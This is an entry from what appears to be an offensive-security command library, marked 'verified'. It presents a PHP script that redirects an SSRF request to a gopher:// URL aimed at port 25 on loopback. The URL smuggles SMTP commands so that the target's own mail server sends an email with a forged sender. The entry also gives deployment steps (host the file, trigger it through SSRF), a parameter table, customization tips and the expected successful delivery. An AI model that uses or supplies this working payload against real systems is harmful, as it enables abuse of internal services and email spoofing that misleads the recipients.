---
type: command
executor: php
data: |-
  <?php
          $commands = array(
                  'HELO victim.com',
                  'MAIL FROM: <admin@victim.com>',
                  'RCPT To: <sxcurity@oou.us>',
                  'DATA',
                  'Subject: @sxcurity!',
                  'Corben was here, woot woot!',
                  '.'
          );

          $payload = implode('%0A', $commands);

          header('Location: gopher://0:25/_'.$payload);
  ?>
tags:
  - ssrf
  - gopher
  - smtp
platforms:
  - Linux
  - Web
verified: true
validated: true
---

# generate-gopher-smtp-payload

## Command

```php
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

## Description

This PHP command (script) generates an encoded SMTP payload and issues an HTTP redirect to a Gopher URL that exploits SSRF to send a spoofed email via the target's SMTP server on port 25. Save as a .php file and host it, then trigger via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| victim.com | Victim's domain for HELO command | Yes |
| admin@victim.com | Spoofed sender email in MAIL FROM | Yes |
| sxcurity@oou.us | Recipient email in RCPT TO | Yes |
| @sxcurity! | Email subject line | Yes |
| Corben was here, woot woot! | Email body content | Yes |
| . | SMTP message terminator | Yes (built-in) |
| %0A | CRLF encoding for SMTP commands | Built-in |
| gopher://0:25 | Protocol and port for SMTP (0 = loopback) | Built-in |

## Examples

### Basic Usage

Save the script as redirect.php and access http://yourserver.com/redirect.php to trigger the redirect.

### Advanced Usage

Modify the $commands array for custom emails, e.g., add CC recipients or attachments if SMTP supports.

```php
$commands = array('HELO example.com', 'MAIL FROM: <spoofed@domain>', ...);
```

## Expected Output

When accessed via browser or SSRF fetch: HTTP 302 redirect to gopher://0:25/_HELO%20victim.com%0AMAIL%20FROM%3A%20%3Cadmin@victim.com%3E%0A... (no visible output, but triggers SMTP relay). Success: Email delivered to recipient with spoofed sender.

## Related

- [[procedures/Gopher-SMTP-Email-Spoofing-via-SSRF]]
- [[codes/PHP-Gopher-SMTP-Email-Spoof-Redirect]]
